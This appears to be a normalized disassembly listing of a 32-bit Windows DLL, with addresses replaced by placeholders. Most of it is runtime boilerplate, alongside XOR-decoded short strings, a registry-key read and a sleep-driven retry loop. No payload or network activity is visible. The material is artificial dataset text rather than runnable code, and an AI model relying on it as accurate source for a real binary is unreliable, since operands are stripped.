push eax
push ecx
push ecx
fstp [ esp ]
call sub_1002178c
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
test eax eax
jns r-xdata
fld [ ebp + 0x8 ]
push edi
fadd [ r--data ]
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
cmp eax 0x2
jle r-xdata
fld [ ebp + 0x8 ]
mov edx 0x7fffffff
sub edx eax
cmp ecx edx
jg r-xdata
mov edx 0x80000000
sub edx eax
cmp ecx edx
jl r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x3
jne r-xdata
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ rw-data ]
fstp [ esp ]
call sub_1000103a
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ esp ]
push ecx
push ecx
add eax ecx
cmp eax 0xa00
jle r-xdata
fmul [ r--data ]
jmp r-xdata
fild [ ebp + 0x10 ]
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
call sub_10028cba
add esp 0x18
jmp r-xdata
call sub_10060dbd
add esp 0x24
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10022fe3
add esp 0xc
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
jmp r-xdata
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10022fe3
push esi
fstp [ ebp + 0x8 ]
push edi
call sub_1002b306
add esp 0x14
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10022fe3
add esp 0xc
jmp r-xdata
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_10052a7b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1004d400
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_10062d93
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10052ab0
push ebp
mov ebp esp
sub esp 0x68c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi edx
mov [ ebp - 0x684 ] ecx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
setne cl
push ebx
push edi
lea edx [ ebp - 0x60 ]
mov eax 0x2
add ecx 0x80000001
mov [ ebp - 0x688 ] ecx
call sub_100120a0
lea edx [ ebp - 0x68c ]
mov eax 0x1
call sub_100120a0
lea edx [ ebp - 0x680 ]
mov eax 0x3
call sub_100120a0
lea edx [ ebp - 0x67c ]
mov eax 0x5
call sub_100120a0
mov edi [ StrStrW@IAT ]
push edx
push esi
call edi
lea ecx [ ebp - 0x678 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
nop
lea ebx [ ebp - 0x680 ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
jne r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push esi
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x684 ]
lea ecx [ ebp - 0x67c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x680 ]
push eax
call sub_1004e6c0
test eax eax
je r-xdata
mov ecx [ ebp - 0x684 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea eax [ ebp - 0x680 ]
push eax
call sub_1004e6c0
test eax eax
jne r-xdata
mov edi [ StrStrW@IAT ]
mov eax [ ebp - 0x684 ]
lea edx [ ebp - 0x67c ]
push edx
push eax
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x68c ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea ecx [ ebp - 0x680 ]
push ecx
call sub_1004e6c0
test eax eax
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
call sub_1004e6c0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_1004e6c0
test eax eax
jne r-xdata
mov ecx [ ebp - 0x688 ]
lea edx [ ebp - 0x688 ]
push edx
push 0x20119
push eax
lea eax [ ebp - 0x60 ]
push eax
push ecx
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x688 ]
push edx
mov eax ebx
push eax
call sub_100197c0
add esp 0x8
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10052d44
push 0x10
push r--data
call sub_1007fb20
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_100427ff
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb65
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10013b34
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10070dd7
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10052e10
mov eax [ ebp - 0x1c ]
sub_10052e20
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e91
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] 0x2
cmp [ esi + 0x8 ] edi
je r-xdata
mov eax [ esi + 0xa0 ]
cmp eax edi
je r-xdata
call [ r--data ]
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
mov eax [ esi + 0x8c ]
mov [ esi + 0x70 ] r--data
cmp eax edi
je r-xdata
push eax
call sub_100187af
add esp 0x4
mov eax [ esi + 0x7c ]
cmp eax edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
push eax
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] edi
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] edi
mov [ esi + 0xc ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
push edx
call sub_100187af
add esp 0x4
sub_10052f30
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edx [ edi ]
mov edx [ edx + 0x10 ]
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp + 0xa ]
push ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push esi
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call edx
test eax eax
jne r-xdata
cmp eax 0x3
mov eax [ ebp - 0x4 ]
jne r-xdata
lea eax [ ebp + 0xa ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
pop edi
sub eax esi
pop esi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
mov esi [ ebp + 0xc ]
cmp ecx [ ebp + 0x14 ]
jb r-xdata
inc [ ebp - 0x4 ]
cmp esi ebx
je r-xdata
sub_10052fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086290
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1001f84c
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10053090
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x69
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe7
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x24 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff85
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x7
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x20 ]
xor eax eax
push ecx
mov [ ebp - 0x12 ] ax
call esi
lea edx [ ebp - 0x34 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_1007f5d0
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_1007f5d0
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x34 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_1007f5d0
add esp 0xc
lea eax [ ebp - 0x34 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_1007f5d0
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x20 ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_1007f5d0
add esp 0xc
lea edx [ ebp - 0x20 ]
push edx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10053240
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10053281
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_100532c3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_1006299d
mov [ eax ] 0x9
call sub_100427ff
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_10053319
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_100533b0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8
push esi
mov esi [ ebp + 0x8 ]
inc [ esi + 0x54 ]
cmp [ esi + 0x54 ] 0x5
push edi
jae r-xdata
mov [ esi + 0x50 ] 0xff000001
mov eax [ esi + 0x58 ]
cmp eax [ esi + 0x5c ]
jge r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
jmp r-xdata
mov edi [ GetSystemTimeAsFileTime@IAT ]
mov edx [ esi ]
xor eax eax
cmp [ esi + 0x50 ] eax
mov ecx esi
setne al
add eax 0x4
mov [ esi + 0x48 ] eax
mov eax [ edx + 0x4 ]
call eax
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x2
call eax
lea ecx [ esp + 0x8 ]
push ecx
call edi
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
mov [ esi + 0x68 ] edx
mov edx [ esi ]
mov [ esi + 0x6c ] eax
mov eax [ edx + 0x14 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x3
call eax
cmp [ esi + 0x50 ] 0xffffffff
je r-xdata
mov ecx [ esi + 0x60 ]
imul ecx ecx 0x3e8
push ecx
call [ Sleep@IAT ]
inc [ esi + 0x58 ]
mov edx [ esi + 0x58 ]
cmp edx [ esi + 0x5c ]
jl r-xdata
sub_10053470
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x18
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov eax esi
call sub_10073b80
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x18
test eax eax
je r-xdata
sub_100534d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088ca4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x208
xor edi edi
lea eax [ ebp - 0x2a8 ]
mov ebx ecx
push edi
push eax
mov [ ebp - 0x328 ] ebx
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x2a8 ]
call sub_10036cc0
mov esi eax
cmp esi edi
je r-xdata
mov esi [ ebx ]
lea edi [ ebp - 0x31c ]
call sub_1005a1d0
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0xfe
call sub_10045930
lea ecx [ ebp - 0x2e0 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x2c4 ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0x19 ]
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
mov ebx 0x8
cmp [ ebp - 0x2b0 ] ebx
jb r-xdata
mov ebx [ ebx ]
lea eax [ ebp - 0x320 ]
push eax
lea ecx [ ebp - 0x324 ]
mov [ ebp - 0x31c ] edi
mov [ ebp - 0x320 ] edi
mov [ ebp - 0x324 ] edi
call sub_100195d0
mov esi eax
mov ebx 0x8
test esi esi
je r-xdata
lea edx [ ebp - 0x54 ]
lea eax [ edi + 0x17 ]
call sub_10045930
lea edx [ ebp - 0x2e0 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x54 ]
lea esi [ ebp - 0x2c4 ]
mov [ ebp - 0x4 ] 0x2
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0x19 ]
mov [ ebp - 0x4 ] 0x3
call sub_100205a0
mov ebx 0x8
cmp [ ebp - 0x2b0 ] ebx
jb r-xdata
xor eax eax
mov [ ebp - 0x2b0 ] 0x7
mov [ ebp - 0x2b4 ] edi
mov [ ebp - 0x2c4 ] ax
cmp [ ebp - 0x2cc ] ebx
jb r-xdata
mov edx [ ebp - 0x2c4 ]
push edx
call sub_100187af
add esp 0x4
lea edi [ ebp - 0x324 ]
lea ecx [ ebp - 0x320 ]
call sub_10014c90
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0xef
call sub_10045930
lea ecx [ ebp - 0x2e0 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x2c4 ]
mov [ ebp - 0x4 ] 0x4
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ ebx + 0x11 ]
mov [ ebp - 0x4 ] 0x5
call sub_100205a0
cmp [ ebp - 0x2b0 ] ebx
jb r-xdata
xor ecx ecx
mov [ ebp - 0x2b0 ] 0x7
mov [ ebp - 0x2b4 ] edi
mov [ ebp - 0x2c4 ] cx
cmp [ ebp - 0x2cc ] ebx
jb r-xdata
mov eax [ ebp - 0x2c4 ]
push eax
call sub_100187af
add esp 0x4
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x2e0 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x324 ]
mov ecx [ ebp - 0x320 ]
push eax
push ecx
lea eax [ ebp - 0x2a8 ]
call sub_10005c30
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x139
call sub_10045930
lea edx [ ebp - 0x2c4 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x2e0 ]
mov [ ebp - 0x4 ] 0x6
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x19
mov [ ebp - 0x4 ] 0x7
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x2c4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10019100
mov [ ebp - 0x31c ] 0x4
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x2b0 ] 0x7
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x2c4 ] ax
cmp [ ebp - 0x2cc ] ebx
jb r-xdata
mov edx [ ebp - 0x2c4 ]
push edx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x2e0 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x328 ]
mov esi [ eax ]
call sub_10007720
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x5a
call sub_10045930
lea edx [ ebp - 0x2c4 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x2e0 ]
mov [ ebp - 0x4 ] 0x8
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x19
mov [ ebp - 0x4 ] 0x9
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x2c4 ]
call sub_10019100
mov eax 0x5
jmp r-xdata
mov [ ebp - 0x31c ] 0x3
mov ecx [ ebp - 0x2e0 ]
push ecx
call sub_100187af
add esp 0x4
mov esi [ ebp - 0x31c ]
lea edx [ ebp - 0xa0 ]
mov eax 0x5a
call sub_10045930
lea ecx [ ebp - 0x318 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xa0 ]
lea esi [ ebp - 0x2fc ]
mov [ ebp - 0x4 ] 0xa
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x19
mov [ ebp - 0x4 ] 0xb
call sub_100205a0
cmp [ ebp - 0x2e8 ] ebx
jb r-xdata
mov eax esi
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor eax eax
mov [ ebp - 0x2e8 ] 0x7
mov [ ebp - 0x2ec ] 0x0
mov [ ebp - 0x2fc ] ax
cmp [ ebp - 0x304 ] ebx
jb r-xdata
mov edx [ ebp - 0x2fc ]
push edx
call sub_100187af
add esp 0x4
mov esi 0x6
jmp r-xdata
mov ecx [ ebp - 0x318 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x320 ]
test eax eax
je r-xdata
sub_1005393c
mov edi edi
push ebp
mov ebp esp
mov dx [ ebp + 0xc ]
push esi
cmp [ ebp + 0x10 ] dx
ja r-xdata
cmp [ ebp + 0x14 ] dx
ja r-xdata
movzx ecx [ ebp + 0x10 ]
movzx eax dx
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x18 ] dx
ja r-xdata
movzx ecx [ ebp + 0x14 ]
movzx eax dx
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movzx ecx [ ebp + 0x18 ]
movzx eax dx
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_100539a0
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_10083c73
mov [ rw-data ] 0x1
call sub_1003531e
pop ecx
sub_100539d0
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_100187af
add esp 0x4
sub_10053a20
push ebp
mov ebp esp
push 0xffffffff
push sub_100861e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x28 ] esi
call sub_1002f11b
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x18 ] r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
lea edi [ eax + 0x1 ]
push edi
call sub_1001df01
add esp 0x4
mov [ ebp - 0x1c ] eax
mov ecx eax
nop
call sub_10059d69
mov eax [ ebp - 0x18 ]
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x8 ] ecx
call sub_10059d69
mov [ ebp - 0x1c ] edx
lea edx [ ebp - 0x20 ]
push edx
push ebx
push r--data
mov [ ebp - 0x20 ] eax
call sub_10017f00
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_10059d69
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
mov [ ebp - 0x1c ] edx
call sub_10017f00
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_10059d69
mov edi [ ebp - 0x24 ]
mov ecx [ edi ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
mov dl [ ecx ]
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x14 ] dl
push 0x1
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10026eb0
mov cx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xc ] cx
call sub_10059d69
mov [ ebp - 0x28 ] edx
mov edx [ edi + 0x4 ]
mov [ ebp - 0x2c ] eax
mov al [ edx ]
